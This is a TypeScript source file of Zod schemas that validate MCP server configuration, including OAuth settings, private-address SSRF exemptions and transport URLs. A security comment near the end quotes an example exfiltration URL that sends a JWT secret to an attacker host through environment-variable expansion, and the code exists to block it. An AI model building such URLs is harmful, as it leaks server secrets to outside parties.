import { z } from 'zod';
import { TokenExchangeMethodEnum } from './types/agents';
import { extractEnvVariable } from './utils';

const validateOAuthClientCredentials = (
  oauth: {
    client_id?: string;
    client_secret?: string;
    authorization_url?: string;
    token_url?: string;
  },
  ctx: z.RefinementCtx,
): void => {
  if (oauth.client_secret && !oauth.client_id) {
    ctx.addIssue({
      code: z.ZodIssueCode.custom,
      path: ['client_secret'],
      message: 'OAuth client_secret requires client_id',
    });
  }

  if (oauth.client_id && oauth.client_secret && (!oauth.authorization_url || !oauth.token_url)) {
    ctx.addIssue({
      code: z.ZodIssueCode.custom,
      path: ['client_secret'],
      message: 'OAuth client_secret with client_id requires both authorization_url and token_url',
    });
  }
};

const OAuthOptionsBaseSchema = z.object({
  /** OAuth authorization endpoint (optional - can be auto-discovered) */
  authorization_url: z
    .string()
    .transform((val) => extractEnvVariable(val))
    .pipe(z.string().url())
    .optional(),
  /** OAuth token endpoint (optional - can be auto-discovered) */
  token_url: z
    .string()
    .transform((val) => extractEnvVariable(val))
    .pipe(z.string().url())
    .optional(),
  /** OAuth client ID (optional - can use dynamic registration) */
  client_id: z.string().optional(),
  /** OAuth client secret (requires explicit authorization and token endpoints) */
  client_secret: z.string().optional(),
  /** OAuth scopes to request */
  scope: z.string().optional(),
  /** OAuth redirect URI (defaults to /api/mcp/{serverName}/oauth/callback) */
  redirect_uri: z
    .string()
    .transform((val) => extractEnvVariable(val))
    .pipe(z.string().url())
    .optional(),
  /** Token exchange method */
  token_exchange_method: z.nativeEnum(TokenExchangeMethodEnum).optional(),
  /** Supported grant types (defaults to ['authorization_code', 'refresh_token']) */
  grant_types_supported: z.array(z.string()).optional(),
  /** Supported token endpoint authentication methods (defaults to ['client_secret_basic', 'client_secret_post']) */
  token_endpoint_auth_methods_supported: z.array(z.string()).optional(),
  /** Supported response types (defaults to ['code']) */
  response_types_supported: z.array(z.string()).optional(),
  /** Supported code challenge methods (defaults to ['S256', 'plain']) */
  code_challenge_methods_supported: z.array(z.string()).optional(),
  /** Skip code challenge validation and force S256 (useful for providers like AWS Cognito that support S256 but don't advertise it) */
  skip_code_challenge_check: z.boolean().optional(),
  /**
   * Auth0/Cognito-style `audience` parameter. Authorization servers that pre-date
   * RFC 8707 — most prominently Auth0 — issue API-scoped access tokens only when
   * the `/authorize` request advertises an `audience`. RFC 8707 `resource` (set
   * automatically from Protected Resource Metadata) is the standards-conformant
   * route; `audience` covers the providers that ignore it.
   *
   * When set, the value is forwarded as-is on `/authorize` (both pre-configured
   * and DCR-discovered paths). Whether it is also forwarded on the
   * `refresh_token` grant is controlled by `forward_audience_on_refresh` below.
   *
   * The `authorization_code` exchange intentionally never receives `audience` —
   * Auth0 binds audience from the original `/authorize` request and embeds it
   * in the issued access token; sending it again is redundant.
   *
   * No canonicalization is applied — the audience identifier is provider-defined
   * and may differ from the MCP server URL. This field is only accepted from
   * trusted/admin MCP configuration and is rejected from user-managed servers.
   */
  audience: z.string().min(1).optional(),
  /**
   * Whether to also forward `audience` on the `refresh_token` grant body.
   *
   * Default: `true`. Required for Auth0, which strips the API audience from
   * refreshed access tokens unless `audience` is re-supplied on every refresh
   * — without it the next MCP call 401s once the initial access token expires.
   *
   * Set to `false` for providers that document refresh requests as
   * `grant_type` + `client_id` + `refresh_token` only (Cognito and other
   * strict OAuth 2.0 token endpoints). Those providers maintain the original
   * `aud` claim across refreshes when the initial token was resource-bound,
   * so the extra parameter is redundant and may be rejected as
   * `invalid_request`.
   *
   * Ignored when `audience` itself is not configured.
   */
  forward_audience_on_refresh: z.boolean().optional(),
  /** OAuth revocation endpoint (optional - can be auto-discovered) */
  revocation_endpoint: z
    .string()
    .transform((val) => extractEnvVariable(val))
    .pipe(z.string().url())
    .optional(),
  /** OAuth revocation endpoint authentication methods supported (optional - can be auto-discovered) */
  revocation_endpoint_auth_methods_supported: z.array(z.string()).optional(),
});

const OAuthOptionsSchema = OAuthOptionsBaseSchema.superRefine(validateOAuthClientCredentials);

const BLOCKED_USER_OAUTH_ENDPOINT_PARAMS = ['audience', 'resource'] as const;
const envVarPattern = /\$\{[^}]+\}/;

const userOAuthEndpointUrlSchema = z
  .string()
  .refine((val) => !envVarPattern.test(val), {
    message: 'Environment variable references are not allowed in URLs',
  })
  .pipe(z.string().url())
  .refine(
    (value) => {
      try {
        const { searchParams } = new URL(value);
        return BLOCKED_USER_OAUTH_ENDPOINT_PARAMS.every((param) => !searchParams.has(param));
      } catch {
        return true;
      }
    },
    { message: 'OAuth endpoint URLs cannot include audience or resource query parameters' },
  );

const UserOAuthOptionsSchema = OAuthOptionsBaseSchema.omit({
  audience: true,
  forward_audience_on_refresh: true,
})
  .extend({
    authorization_url: userOAuthEndpointUrlSchema.optional(),
    token_url: userOAuthEndpointUrlSchema.optional(),
    redirect_uri: userOAuthEndpointUrlSchema.optional(),
    revocation_endpoint: userOAuthEndpointUrlSchema.optional(),
    audience: z.never().optional(),
    forward_audience_on_refresh: z.never().optional(),
  })
  .superRefine(validateOAuthClientCredentials);

const OboOptionsSchema = z.object({
  /** Scopes to request for the downstream MCP server (e.g., "api://<client-id>/Mcp.Tools.ReadWrite") */
  scopes: z.string().min(1),
});

/**
 * `allowedAddresses` is an SSRF exemption list scoped to private IP space.
 * Validate at config-load time:
 *  - Reject URLs, paths, CIDR ranges, bare host/IP forms, and whitespace.
 *  - Require `host:port` or `[ipv6]:port` entries so an exemption is scoped
 *    to one service port instead of every port on a private host.
 *  - Reject IPv4 literals that fall outside the private/loopback/link-local
 *    ranges. Public IPs are never SSRF targets, so listing one has no
 *    defensive purpose and must not silently grant trust.
 *  - Hostnames pass through; their resolved IP is checked at runtime by
 *    `resolveHostnameSSRF` and only a private resolved IP is meaningful.
 *
 * Mirrors a minimal subset of `isPrivateIP` from `@librechat/api` to avoid a
 * circular package dependency. The runtime helper is the authoritative check;
 * this refinement is a UX guardrail.
 */
function isPrivateIPv4Literal(value: string): boolean {
  const match = value.match(/^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$/);
  if (!match) {
    return false;
  }
  const [a, b, c] = match.slice(1).map(Number) as [number, number, number, number];
  if (a === 0 || a === 10 || a === 127) return true;
  if (a === 169 && b === 254) return true;
  if (a === 172 && b >= 16 && b <= 31) return true;
  if (a === 192 && b === 168) return true;
  if (a === 192 && b === 0 && c === 0) return true; // RFC 5736 IETF protocol assignments
  if (a === 100 && b >= 64 && b <= 127) return true;
  if (a === 198 && (b === 18 || b === 19)) return true;
  if (a >= 224) return true; // multicast/reserved
  return false;
}

function isPrivateIPv6Literal(value: string): boolean {
  if (!value.includes(':')) return false;
  if (value === '::1' || value === '::') return true;
  if (value.startsWith('fc') || value.startsWith('fd')) return true; // fc00::/7
  // fe80::/10 — first hextet 0xfe80–0xfebf
  const firstHextet = value.split(':', 1)[0];
  if (/^[0-9a-f]{1,4}$/.test(firstHextet ?? '')) {
    const hextet = parseInt(firstHextet, 16);
    if ((hextet & 0xffc0) === 0xfe80) return true;
  }
  // 4-in-6: ::ffff:A.B.C.D
  const mappedMatch = value.match(/^::ffff:(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})$/);
  if (mappedMatch) return isPrivateIPv4Literal(mappedMatch[1]);
  return false;
}

/**
 * Mirrors the allowedAddresses parser in `@librechat/api`'s auth helpers.
 * Kept as a local copy because the data-provider package cannot import from
 * `@librechat/api` without creating a circular dependency. Keep the two
 * implementations in sync.
 */
function normalizeAllowedPort(port: unknown): string {
  if (typeof port !== 'string' && typeof port !== 'number') return '';
  const portString = String(port).trim();
  if (!/^\d+$/.test(portString)) return '';
  const parsed = Number(portString);
  if (!Number.isInteger(parsed) || parsed < 1 || parsed > 65535) return '';
  return String(parsed);
}

function parseAllowedAddressEntry(entry: string): { address: string; port: string } | null {
  const trimmed = entry.toLowerCase().trim();
  const bracketedIPv6 = trimmed.match(/^\[([^\]]+)\]:(\d+)$/);
  const hostPort = bracketedIPv6 ? null : trimmed.match(/^([^:]+):(\d+)$/);
  const address = (bracketedIPv6?.[1] ?? hostPort?.[1] ?? '').replace(/^\[|\]$/g, '');
  const port = normalizeAllowedPort(bracketedIPv6?.[2] ?? hostPort?.[2] ?? '');
  if (!address || !port) return null;
  return { address, port };
}

const allowedAddressEntrySchema = z
  .string()
  .refine((entry) => entry.length > 0 && entry.trim().length > 0, {
    message: 'allowedAddresses entries must be non-empty',
  })
  .refine((entry) => !entry.includes('://') && !entry.includes('/') && !/\s/.test(entry), {
    message:
      'allowedAddresses entries must be host:port pairs — no URLs, paths, CIDR ranges, or whitespace',
  })
  .refine((entry) => parseAllowedAddressEntry(entry) != null, {
    message:
      'allowedAddresses entries must include a port, for example localhost:11434 or [::1]:11434',
  })
  .refine(
    (entry) => {
      const parsed = parseAllowedAddressEntry(entry);
      if (!parsed) return false;
      const stripped = parsed.address;
      const isIPv4 = /^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$/.test(stripped);
      const isIPv6 = !isIPv4 && stripped.includes(':');
      if (!isIPv4 && !isIPv6) {
        return true; // hostname — checked at runtime via DNS
      }
      return isIPv4 ? isPrivateIPv4Literal(stripped) : isPrivateIPv6Literal(stripped);
    },
    {
      message:
        'allowedAddresses is scoped to private IP space — public IP literals are not permitted (use hostname:port if it resolves to a private IP)',
    },
  );

/**
 * SSRF exemption list of private `host:port` pairs. Defined here (rather than in
 * `config.ts`) so MCP server schemas can reuse it without a circular import;
 * `config.ts` re-exports it for `mcpSettings`/`actions`/`endpoints`.
 */
export const allowedAddressesSchema = z.array(allowedAddressEntrySchema).optional();

const BaseOptionsSchema = z.object({
  /** Display name for the MCP server - only letters, numbers, and spaces allowed */
  title: z
    .string()
    .regex(/^[a-zA-Z0-9 ]+$/, 'Title can only contain letters, numbers, and spaces')
    .optional(),
  /** Description of the MCP server */
  description: z.string().optional(),
  /**
   * Controls whether the MCP server is initialized during application startup.
   * - true (default): Server is initialized during app startup and included in app-level connections
   * - false: Skips initialization at startup and excludes from app-level connections - useful for servers
   *   requiring manual authentication (e.g., GitHub PAT tokens) that need to be configured through the UI after startup
   */
  startup: z.boolean().optional(),
  iconPath: z.string().optional(),
  timeout: z.number().int().nonnegative().optional(),
  /** Timeout (ms) for the long-lived SSE GET stream body before undici aborts it. Default: 300_000 (5 min). */
  sseReadTimeout: z.number().int().positive().optional(),
  initTimeout: z.number().int().nonnegative().optional(),
  /** Controls visibility in chat dropdown menu (MCPSelect) */
  chatMenu: z.boolean().optional(),
  /**
   * Controls server instruction behavior:
   * - undefined/not set: No instructions included (default)
   * - true: Use server-provided instructions
   * - string: Use custom instructions (overrides server-provided)
   */
  serverInstructions: z.union([z.boolean(), z.string()]).optional(),
  /**
   * Whether this server requires OAuth authentication
   * If not specified, will be auto-detected during construction
   */
  requiresOAuth: z.boolean().optional(),
  /**
   * OAuth configuration for SSE and Streamable HTTP transports
   * - Optional: OAuth can be auto-discovered on 401 responses
   * - Pre-configured confidential clients must pin both OAuth endpoints
   */
  oauth: OAuthOptionsSchema.optional(),
  /** Custom headers to send with OAuth requests (registration, discovery, token exchange, etc.) */
  oauth_headers: z.record(z.string(), z.string()).optional(),
  /**
   * API Key authentication configuration for SSE and Streamable HTTP transports
   * - source: 'admin' means the key is provided by admin and shared by all users
   * - source: 'user' means each user provides their own key via customUserVars
   */
  apiKey: z
    .object({
      /** API key value (only for admin-provided mode, stored encrypted) */
      key: z.string().optional(),
      /** Whether key is provided by admin or each user */
      source: z.enum(['admin', 'user']),
      /** How to format the authorization header */
      authorization_type: z.enum(['basic', 'bearer', 'custom']),
      /** Custom header name when authorization_type is 'custom' */
      custom_header: z.string().optional(),
    })
    .optional(),
  customUserVars: z
    .record(
      z.string(),
      z.object({
        title: z.string(),
        description: z.string(),
        /**
         * Whether the field holds a secret and should be masked in the UI.
         * Defaults to masked when omitted; set to `false` for non-secret setup
         * values (e.g. username, project key, base URL) to render as plain text.
         */
        sensitive: z.boolean().optional(),
      }),
    )
    .optional(),
  /**
   * Per-server SSRF exemption list of private `host:port` pairs, merged with the
   * global `mcpSettings.allowedAddresses` to scope a trusted LAN exemption to this
   * one server. Admin/YAML-only — omitted from `MCPServerUserInputSchema` so a
   * user-managed server can never grant itself a private-address exemption.
   */
  allowedAddresses: allowedAddressesSchema,
});

const ProxyUrlSchema = z
  .string()
  .transform((val: string) => extractEnvVariable(val))
  .pipe(z.string().url())
  .refine(
    (val: string) => {
      const protocol = new URL(val).protocol;
      return (
        protocol === 'http:' ||
        protocol === 'https:' ||
        protocol === 'socks:' ||
        protocol === 'socks5:'
      );
    },
    {
      message: 'Proxy URL must use http://, https://, socks://, or socks5://',
    },
  );

export const StdioOptionsSchema = BaseOptionsSchema.extend({
  type: z.literal('stdio').default('stdio'),
  obo: z.undefined().optional(),
  /**
   * The executable to run to start the server.
   */
  command: z.string(),
  /**
   * Command line arguments to pass to the executable.
   */
  args: z.array(z.string()),
  /**
   * The environment to use when spawning the process.
   *
   * If not specified, the result of getDefaultEnvironment() will be used.
   * Environment variables can be referenced using ${VAR_NAME} syntax.
   */
  env: z
    .record(z.string(), z.string())
    .optional()
    .transform((env) => {
      if (!env) {
        return env;
      }

      const processedEnv: Record<string, string> = {};
      for (const [key, value] of Object.entries(env)) {
        processedEnv[key] = extractEnvVariable(value);
      }
      return processedEnv;
    }),
  /**
   * How to handle stderr of the child process.
   * Accepts: 'pipe' | 'ignore' | 'inherit' | file descriptor number.
   * Defaults to "inherit".
   */
  stderr: z
    .union([z.enum(['pipe', 'ignore', 'inherit']), z.number().int().nonnegative()])
    .optional(),
});

export const WebSocketOptionsSchema = BaseOptionsSchema.extend({
  type: z.literal('websocket').default('websocket'),
  obo: z.undefined().optional(),
  url: z
    .string()
    .transform((val: string) => extractEnvVariable(val))
    .pipe(z.string().url())
    .refine(
      (val: string) => {
        const protocol = new URL(val).protocol;
        return protocol === 'ws:' || protocol === 'wss:';
      },
      {
        message: 'WebSocket URL must start with ws:// or wss://',
      },
    ),
});

export const SSEOptionsSchema = BaseOptionsSchema.extend({
  type: z.literal('sse').default('sse'),
  /**
   * Internal flag (not user-facing): set by `markSSETransportFallback` when a
   * remote server is configured with a `url` but no explicit `type`. Signals the
   * connection layer to auto-detect the transport (prefer Streamable HTTP, fall
   * back to SSE). Explicitly typed servers never carry this flag.
   */
  transportFallback: z.boolean().optional(),
  headers: z.record(z.string(), z.string()).optional(),
  /**
   * On-Behalf-Of (OBO) token exchange configuration.
   * When configured, LibreChat exchanges the logged-in user's federated access token
   * for a token scoped to this MCP server via the OAuth 2.0 OBO flow (jwt-bearer grant).
   * The exchanged token is injected as a Bearer Authorization header automatically.
   * Requires the user to be authenticated via OpenID Connect (e.g., Entra ID).
   */
  obo: OboOptionsSchema.optional(),
  /** Optional outbound proxy URL for this remote MCP transport */
  proxy: ProxyUrlSchema.optional(),
  url: z
    .string()
    .transform((val: string) => extractEnvVariable(val))
    .pipe(z.string().url())
    .refine(
      (val: string) => {
        const protocol = new URL(val).protocol;
        return protocol !== 'ws:' && protocol !== 'wss:';
      },
      {
        message: 'SSE URL must not start with ws:// or wss://',
      },
    ),
});

export const StreamableHTTPOptionsSchema = BaseOptionsSchema.extend({
  type: z.union([z.literal('streamable-http'), z.literal('http')]),
  headers: z.record(z.string(), z.string()).optional(),
  /**
   * On-Behalf-Of (OBO) token exchange configuration.
   * When configured, LibreChat exchanges the logged-in user's federated access token
   * for a token scoped to this MCP server via the OAuth 2.0 OBO flow (jwt-bearer grant).
   * The exchanged token is injected as a Bearer Authorization header automatically.
   * Requires the user to be authenticated via OpenID Connect (e.g., Entra ID).
   */
  obo: OboOptionsSchema.optional(),
  /** Optional outbound proxy URL for this remote MCP transport */
  proxy: ProxyUrlSchema.optional(),
  url: z
    .string()
    .transform((val: string) => extractEnvVariable(val))
    .pipe(z.string().url())
    .refine(
      (val: string) => {
        const protocol = new URL(val).protocol;
        return protocol !== 'ws:' && protocol !== 'wss:';
      },
      {
        message: 'Streamable HTTP URL must not start with ws:// or wss://',
      },
    ),
});

/**
 * When a remote MCP server is configured with a `url` but no explicit `type`,
 * the union resolves it as SSE (the schema's default), which silently fails
 * against gateways that only speak Streamable HTTP. This marks such configs with
 * `transportFallback: true` so the connection layer can auto-detect the transport
 * (prefer Streamable HTTP, fall back to SSE). Stdio (no `url`) and explicitly
 * typed remote servers are left untouched.
 */
const markSSETransportFallback = (val: unknown): unknown => {
  if (
    val &&
    typeof val === 'object' &&
    !Array.isArray(val) &&
    'url' in val &&
    !('type' in val)
  ) {
    return { ...(val as Record<string, unknown>), type: 'sse', transportFallback: true };
  }
  return val;
};

export const MCPOptionsSchema = z.preprocess(
  markSSETransportFallback,
  z.union([
    StdioOptionsSchema,
    WebSocketOptionsSchema,
    SSEOptionsSchema,
    StreamableHTTPOptionsSchema,
  ]),
);

export const MCPServersSchema = z.record(z.string(), MCPOptionsSchema);

export type MCPOptions = z.infer<typeof MCPOptionsSchema>;

/**
 * Helper to omit server-managed fields that should not come from UI
 */
const omitServerManagedFields = <T extends z.ZodObject<z.ZodRawShape>>(schema: T) =>
  schema.omit({
    startup: true,
    timeout: true,
    sseReadTimeout: true,
    initTimeout: true,
    chatMenu: true,
    serverInstructions: true,
    requiresOAuth: true,
    customUserVars: true,
    oauth_headers: true,
    allowedAddresses: true,
    transportFallback: true,
  });

const userManagedServerFields = <T extends z.ZodObject<z.ZodRawShape>>(schema: T) =>
  omitServerManagedFields(schema).extend({
    oauth: UserOAuthOptionsSchema.optional(),
  });

const isWsProtocol = (val: string): boolean => /^wss?:/i.test(val);
const isHttpProtocol = (val: string): boolean => /^https?:/i.test(val);

/**
 * Builds a URL schema for user input that rejects ${VAR} env variable patterns
 * and validates protocol constraints without resolving environment variables.
 */
const userUrlSchema = (protocolCheck: (val: string) => boolean, message: string) =>
  z
    .string()
    .refine((val) => !envVarPattern.test(val), {
      message: 'Environment variable references are not allowed in URLs',
    })
    .pipe(z.string().url())
    .refine(protocolCheck, { message });

/**
 * MCP Server configuration that comes from UI/API input only.
 * Omits server-managed fields like startup, timeout, customUserVars, etc.
 * Allows: title, description, url, iconPath, oauth (user credentials).
 * Admin-only OAuth audience fields are rejected for user-managed servers.
 *
 * SECURITY: Stdio transport is intentionally excluded from user input.
 * Stdio allows arbitrary command execution and should only be configured
 * by administrators via the YAML config file (librechat.yaml).
 * Only remote transports (SSE, HTTP, WebSocket) are allowed via the API.
 *
 * SECURITY: URL fields use userUrlSchema instead of the admin schemas'
 * extractEnvVariable transform to prevent env variable exfiltration
 * through user-controlled URLs (e.g. http://attacker.com/?k=${JWT_SECRET}).
 * Protocol checks use positive allowlists (http(s) / ws(s)) to block
 * file://, ftp://, javascript:, and other non-network schemes.
 */
export const MCPServerUserInputSchema = z.union([
  userManagedServerFields(WebSocketOptionsSchema).extend({
    url: userUrlSchema(isWsProtocol, 'WebSocket URL must use ws:// or wss://'),
  }),
  userManagedServerFields(SSEOptionsSchema).extend({
    proxy: z.never().optional(),
    url: userUrlSchema(isHttpProtocol, 'SSE URL must use http:// or https://'),
  }),
  userManagedServerFields(StreamableHTTPOptionsSchema).extend({
    proxy: z.never().optional(),
    url: userUrlSchema(isHttpProtocol, 'Streamable HTTP URL must use http:// or https://'),
  }),
]);

export type MCPServerUserInput = z.infer<typeof MCPServerUserInputSchema>;

/**
 * Set of every field name that may appear in a user-submitted MCP server config,
 * derived from `MCPServerUserInputSchema`'s union members. Used as the comparison
 * surface for the OBO lockdown check in `updateMCPServerController` so that
 * server-managed fields on the existing config (`dbId`, `source`, `author`,
 * `requiresOAuth`, `oauthMetadata`, etc.) don't show up as differences and
 * cause spurious 403s on legitimate saves.
 *
 * Schema-derived rather than hand-maintained: when a new field is added to
 * `BaseOptionsSchema` or any transport variant, it flows into this set
 * automatically. The OBO lockdown then locks the new field by default
 * (since it won't be in the hand-curated `OBO_USER_EDITABLE_FIELDS`
 * allowlist), preventing a silent privilege regression.
 */
export const MCP_USER_INPUT_FIELDS: ReadonlySet<string> = (() => {
  const fields = new Set<string>();
  for (const variant of MCPServerUserInputSchema.options) {
    const shape = (variant as unknown as { shape: Record<string, unknown> }).shape;
    for (const key of Object.keys(shape)) {
      fields.add(key);
    }
  }
  return fields;
})();
